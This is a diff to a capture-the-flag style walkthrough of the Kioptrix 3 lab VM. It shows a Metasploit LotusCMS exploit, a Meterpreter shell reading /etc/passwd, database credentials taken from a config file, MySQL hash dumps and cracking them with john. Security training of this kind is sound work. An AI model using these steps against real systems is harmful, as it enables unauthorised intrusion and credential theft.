@@ -115,12 +115,12 @@ However, at this stage we are unable to use any SQL injection at our current low
 Browsing around the site we can see a blog and a login portal.
 
 The portal states that it is:
-> Proudly running on LotusCMS
+> Proudly powered by LotusCMS
 
 A simple `searchsploit` on this CMS reveals the following:
 https://www.rapid7.com/db/modules/exploit/multi/http/lcms_php_exec.
 
-We used Metasploit to gain a meterpreter shell like follows:
+We used Metasploit to gain a Meterpreter shell like follows:
 
 ```
 use exploit/multi/http/lcms_php_exec
@@ -129,6 +129,8 @@ set URI /index.php?system=Admin
 exploit
 ```
 
+## Initial Shell
+
 ```
 meterpreter > getuid
 Server username: www-data (33)
@@ -136,6 +138,11 @@ Server username: www-data (33)
 meterpreter > cat /etc/passwd
 loneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash
 dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash
+
+meterpreter > sysinfo
+Computer    : Kioptrix3
+OS          : Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
+Meterpreter : php/linux
 ```
 
 Looking at the PHP files we can see some of the config files. Of interest is `gconfig.php` which contains some GLOBALS:
@@ -147,3 +154,66 @@ $GLOBALS["gallarific_mysql_database"] = "gallery";
 $GLOBALS["gallarific_mysql_username"] = "root";
 $GLOBALS["gallarific_mysql_password"] = "fuckeyou";
 ```
+
+Looking around the filesystem we can see some interesting files in the home of user `loneferret`.
+
+```bash
+cat /home/loneferret/CompanyPolicy.README
+```
+
+```
+It is company policy to use 'sudo ht' to edit and view files.
+```
+
+## MySQL
+
+We can see the daemon running:
+
+```
+/usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --port=3306
+```
+
+Using `root:fuckeyou` we can login to the database using `mysql`.
+
+```
+mysql -u root -p --port=3306
+```
+
+Doing this via Meterpreter we need to use `shell`.
+This did cause difficulties in terms of output being unreliable to the screen, however using `; ?` seemed to work.
+
+Now we can run some commands on the Database:
+
+```SQL
+USE DATABASE MYSQL;
+SELECT * FROM users;
+```
+
+```
+localhost	root	*47FB3B1E573D80F44CD198DC65DE7764795F948E
+```
+
+```SQL
+USE DATABASE galleryL;
+SELECT * FROM dev_accounts;
+```
+
+```
+id	username	  password
+1	  dreg	      0d3eccfb887aabd50f243b3f155c0f85
+2	  loneferret	5badcaf789d3d1d09794d8f021f40f0e
+```
+
+**Now we have some account hashes to crack.**
+
+## Cracking Hashes
+
+We put our hashes in a file and let `john` loose:
+
+```bash
+john hashes.txt --format=Raw-MD5
+```
+
+We find `loneferret:starwars` pretty quickly.
+
+We can then `ssh` into `kioptrix3`.
